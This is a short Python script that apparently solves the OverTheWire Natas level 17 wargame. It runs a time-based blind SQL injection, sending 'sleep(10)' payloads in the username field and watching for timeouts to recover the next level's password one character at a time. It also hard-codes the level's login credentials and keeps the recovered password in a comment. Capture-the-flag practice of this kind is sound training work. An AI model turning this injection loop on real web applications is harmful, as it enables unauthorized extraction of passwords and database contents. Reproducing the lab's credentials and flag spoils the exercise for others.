import requests
import string

credentials = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
url = 'http://natas17.natas.labs.overthewire.org'
alphabet = string.ascii_letters + string.digits
template = 'natas18" and password like binary "{}%" and sleep(10) -- '

flag = ''   # xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
running = True
while running:
    found = False
    for c in alphabet:
        try:
            print(flag + c)
            r = requests.get(url, params={'username': template.format(flag + c)}, timeout=6, auth=credentials)
            continue
        except requests.exceptions.Timeout:
            flag += c
            found = True
            break

    if found == False:
        running = False

print('Done')
print('Password:', flag)



